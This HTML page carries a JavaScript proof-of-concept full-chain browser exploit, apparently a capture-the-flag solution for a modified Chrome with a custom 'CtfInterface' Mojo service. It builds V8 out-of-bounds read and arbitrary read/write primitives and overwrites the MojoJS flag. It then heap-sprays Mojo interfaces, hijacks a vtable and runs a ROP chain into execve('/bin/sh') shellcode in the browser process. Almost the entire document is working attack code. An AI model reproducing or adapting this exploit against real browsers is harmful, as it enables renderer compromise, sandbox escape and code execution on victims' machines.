<!DOCTYPE html>
<html>
    <head>
	// import mojo javascript bindings
	<script src="mojo_bindings/mojo_bindings.js"></script>
        <script src="mojo_bindings/third_party/blink/public/mojom/CTF/ctf_interface.mojom.js"></script>
	<script src="mojo_bindings/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
    </head>
    <body>
        <script>
// This POC exploits the renderer process to enable mojo, reloads the webpage, then exploits the browser
// process to execute a user-privileged shell in the main browser process.
/**
 * Utils
 */
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}

// execve("/bin/sh")
let shellcode = [8.689034976057858e-308, 5.629558420881076e-308, 2.814779210440538e-308, 5.272892808344879e-21, -3.754538247695724e-34, 8.931534512674479e+164, 5.4725462592149954e+169, 1.400507102085268e+195, -6.828527034422575e-229];

function pwn_v8()
{
    function make_primitives() {
        let y = new Uint32Array(1);
        let x = new Uint32Array(1);

        // we overwrite the length field of array z
        // to achieve out-of-bounds read
        let z = [1.1, 1.1, 1.1, 1.1];

        // this array will store objects for the
        // addrof primitive
        let arr_addrof = [{}];
        // this array is used to leak the high pointer
        // since it contains a full address
        let f_arr = new Float64Array(1);

        // copy 0x8888 into y
        // this is the array length size
        y.set([0x8888], 0);
	// NOTE: This offset was changed from 33 -> 32 to work for the full-chain exploit.
        // copy y into offset 32 which will
        // be the length field of array z. we overwrite
        // it with a large value like 0x8888 so we can
        // now perform out-of-bounds read.
        x.set(y, 32);
        console.log("[+] z.length = " + z.length);
        return [z, arr_addrof, f_arr];
    }

    let [z, arr_addrof, f_arr] = make_primitives();
    let heap_upper = z[28].f2i() & 0xffffffff00000000n;
    console.log("[+] heap_upper = " + heap_upper.hex());
    // we save the original TypedArray object's pointer
    // to restore it at the end and make the garbage
    // collector happy.
    let original_28 = z[28];
    let original_29 = z[29];

    function addrof(obj) {
        arr_addrof[0] = obj;
        // we use the out-of-bounds read from array z
        // to leak the address of our target object
        // stored in arr_addrof
        return (z[7].f2i() & 0xffffffffn) - 1n;
    }
    function aar64(addr) {
        // overwrite 32-bits of the pointer
        z[28] = ((addr & 0xffffffff00000000n) | 7n).i2f();
        // overwrite the next 32-bits of the pointer
        z[29] = (((addr - 8n) | 1n) & 0xffffffffn).i2f();
        // arbitrary address read using the full pointer
        // we overwrote in the TypedArray object.
        return f_arr[0].f2i();
    }
    function aaw64(addr, value) {
        // overwrite 32-bits of the pointer
        z[28] = ((addr & 0xffffffff00000000n) | 7n).i2f();
        // overwrite the next 32-bits of the pointer
        z[29] = (((addr - 8n) | 1n) & 0xffffffffn).i2f();
        // arbitrary address write using the full pointer
        // we overwrote in the TypedArray object.
        f_arr[0] = value.i2f();
    }
    function cleanup() {
        // restore the original TypedArray object's
        // pointer to make the garbage collector happy.
        z[28] = original_28;
        z[29] = original_29;
    }

    /* Leak chrome base.
    * Use the high pointer leak and the addrof primitive to obtain the address of the div object.
    * Pass the address to the arbitrary-address-read to obtain a chrome memory address.
    * Subtract the offset of the memory address to compute the chrome base address.
    */
    let div = document.createElement('div');
    let addr_div = heap_upper | addrof(div);
    console.log("[+] addr_div = " + addr_div.hex());
    let addr_HTMLDivElement = aar64(addr_div + 0xCn);
    console.log("[+] <HTMLDivElement> = " + addr_HTMLDivElement.hex());
    let chrome_base = addr_HTMLDivElement - 0xc1bb7c0n;
    console.log("[+] chrome_base = " + chrome_base.hex());

    /* Enable MojoJS
    * Add the offset for the mojo variable to the leaked chrome base.
    * Use the arbitrary-address-write to flip the bits in the flag.
    */
    console.log("[+] Overwriting flags..");
    let addr_flag_MojoJS = chrome_base + 0xc560f0en;
    aaw64(addr_flag_MojoJS & 0xfffffffffffffff8n, 0x0101010101010101n);

    /* Cleanup */
    cleanup();

    // Reload the web-page to execute the next stage of the full-chain-exploit.
    location.href += "#sbx";
    location.reload();
}

async function pwn_sbx() {
    let spray = [];
    /* Spray the heap with ctf interface objects */
    for (let i = 0; i < 0x100; i++) {
        let p = new blink.mojom.CtfInterfacePtr();
        Mojo.bindInterface(blink.mojom.CtfInterface.name,
                           mojo.makeRequest(p).handle, 'context', true);
        await p.resizeVector(0x60 / 8); // sizeof(CtfInterface)
        await p.write(1.1, 1);
        spray.push(p);
    }

    /* Create the target interface we want to find */
    let ctfi = new blink.mojom.CtfInterfacePtr();
    Mojo.bindInterface(blink.mojom.CtfInterface.name,
                       mojo.makeRequest(ctfi).handle, 'context', true);
    await ctfi.resizeVector(0x60 / 8); // sizeof(CtfInterface)
    await ctfi.write(4.20, 0); // write something here to initialize the vector's elements pointer

    /* Spray the heap with ctf interface objects some more*/
    for (let i = 0; i < 0x100; i++) {
        let p = new blink.mojom.CtfInterfacePtr();
        Mojo.bindInterface(blink.mojom.CtfInterface.name,
                           mojo.makeRequest(p).handle, 'context', true);
        await p.resizeVector(0x60 / 8); // sizeof(CtfInterface)
        await p.write(1.1, 1);
        spray.push(p);
    }

    /* Find the interface object by searching for the pattern in memory. We will use this pattern
       to leak the pointers we need (ctf interface object, elements pointer, chrome address). */
    let addr_ctfi = null;
    let addr_elm = null;
    let chrome_base = null;
    for (let i = 1; i < 0x80; i++) {
        let a0 = (await ctfi.read((0x60 / 8) * i + 0)).value.f2i();
        let a1 = (await ctfi.read((0x60 / 8) * i + 1)).value.f2i();
        let a2 = (await ctfi.read((0x60 / 8) * i + 2)).value.f2i();
        if (a0 != 0n && a1 == 0n && a2 == 0n) {
	    /* Possibly found a pointer to the ctf interface object at offset 0 */

	    // Offset 0x30 may be the pointer for computing the elements pointer
            let a6 = (await ctfi.read((0x60 / 8) * i + 6)).value.f2i();

            // Offset 0x38 may be the pointer for computing the chrome base address
            let a7 = (await ctfi.read((0x60 / 8) * i + 7)).value.f2i();
            addr_ctfi = a0;
            addr_elm = a6 - 0x18n - BigInt(0x60 * i);
            chrome_base = a7 - 0xbc77518n;
            break;
        }
    }
    if (addr_elm == null) {
        console.log("[-] Bad luck!");
        return location.reload();
    }
    let offset = Number((addr_ctfi - addr_elm) / 8n);
    console.log("[+] offset = " + offset);
    if (offset < 0) {
        console.log("[-] Bad luck!");
        return location.reload();
    }
    console.log("[+] addr_ctfi = " + addr_ctfi.hex());
    console.log("[+] addr_elm = " + addr_elm.hex());
    console.log("[+] chrome_base = " + chrome_base.hex());

    /* Find the victim object whose std::vector element pointer we will overwrite */
    let original_1, original_2, original_3;
    let victim_ofs = null;
    for (let i = 1; i < 0x100; i++) {
        let v = (await ctfi.read(offset + (0x60 / 8) * i)).value.f2i();
        if ((v & 0xfffn) == 0x4e0n) {
            console.log("[+] Probing victim...");
	    // Save the original elements pointer from the victim object so we can restore
            // it at the end to make the garbage collector happy.
            original_1 = (await ctfi.read(offset + (0x60/8)*i+1)).value;
            original_2 = (await ctfi.read(offset + (0x60/8)*i+2)).value;
            original_3 = (await ctfi.read(offset + (0x60/8)*i+3)).value;
            await ctfi.write(chrome_base.i2f(), offset + (0x60 / 8) * i + 1);
            victim_ofs = i;
            break;
        }
    }
    if (victim_ofs == null) {
        console.log("[-] Bad luck!");
        return location.reload();
    }

    async function cleanup() {
	// Restore the original elements pointer to the victim object to make the garbage collector happy.
        await ctfi.write(original_1,
                         offset + (0x60 / 8) * victim_ofs + 1);
        await ctfi.write(original_2,
                         offset + (0x60 / 8) * victim_ofs + 2);
        await ctfi.write(original_3,
                         offset + (0x60 / 8) * victim_ofs + 3);
    }

    let victim = null;
    for (let p of spray) {
        if ((await p.read(0)).value.f2i() == 0x10102464c457fn) {
            victim = p;
            console.log("[+] Found victim!");
            break;
        }
    }
    if (victim == null) {
        console.log("[-] Bad luck!");
        cleanup();
        return location.reload();
    }

    /* Primitives */
    async function aar64(addr) {
	// overwrite the elements pointer in the victim object with an arbitrary address
        await ctfi.write(addr.i2f(),
                         offset + (0x60 / 8) * victim_ofs + 1);
        await ctfi.write((addr + 0x10n).i2f(),
                         offset + (0x60 / 8) * victim_ofs + 2);
        await ctfi.write((addr + 0x10n).i2f(),
                         offset + (0x60 / 8) * victim_ofs + 3);
	// use the victim object to achieve arbitrary-address-read
        return (await victim.read(0)).value.f2i();
    }
    async function aaw64(addr, value) {
	// overwrite the elements pointer in the victim object with an arbitrary address
        await ctfi.write(addr.i2f(),
                         offset + (0x60 / 8) * victim_ofs + 1);
        await ctfi.write((addr + 0x10n).i2f(),
                         offset + (0x60 / 8) * victim_ofs + 2);
        await ctfi.write((addr + 0x10n).i2f(),
                         offset + (0x60 / 8) * victim_ofs + 3);
	// use the victim object to achieve arbitrary-address-write
        await victim.write(value.i2f(), 0);
    }

    let rop_pop_rdi = chrome_base + 0x035d445dn;
    let rop_pop_rsi = chrome_base + 0x0348edaen;
    let rop_pop_rdx = chrome_base + 0x03655332n;
    let rop_pop_rax = chrome_base + 0x03419404n;
    let rop_syscall = chrome_base + 0x0800dd77n;
    let rop_xchg_rax_rsp = chrome_base + 0x0590510en

    let addr_shellcode = addr_elm & 0xfffffffffffff000n;

    // ROP 2 mprotect shellcode, then pivot to shellcode
    let rop = [
        rop_pop_rdi,
        addr_shellcode,
        rop_pop_rsi,
        rop_xchg_rax_rsp, // vtable target
        rop_pop_rsi,
        0x2000n,
        rop_pop_rdx,
        7n,
        rop_pop_rax,
        10n,
        rop_syscall,
        addr_shellcode
    ];

    // write ROP chain into ctfi's numbers_ vector
    for (let i = 0; i < rop.length; i++) {
        await ctfi.write(rop[i].i2f(), i);
    }

    // write shellcode to an interface object's vector using arbitrary-address-write
    for (let i = 0; i < shellcode.length; i++) {
        await aaw64(addr_shellcode + BigInt(i*8), shellcode[i].f2i());
    }

    // use the arbitrary-address-write to overwrite the vtable of a CtfInterface object 
    await aaw64(addr_ctfi, addr_elm);

    // trigger the vtable hijack by executing the read() instance method.
    setTimeout(() => {
        for (let p of spray) {
            p.read(0);
        }
    }, 3000);

    console.log("[+] Done");
    cleanup();
}

if (location.hash == "") {
    console.log("[+] Renderer exploit!");
    pwn_v8();
} else {
    console.log("[+] Browser exploit!");
    pwn_sbx();
}
        </script>
    </body>
</html>
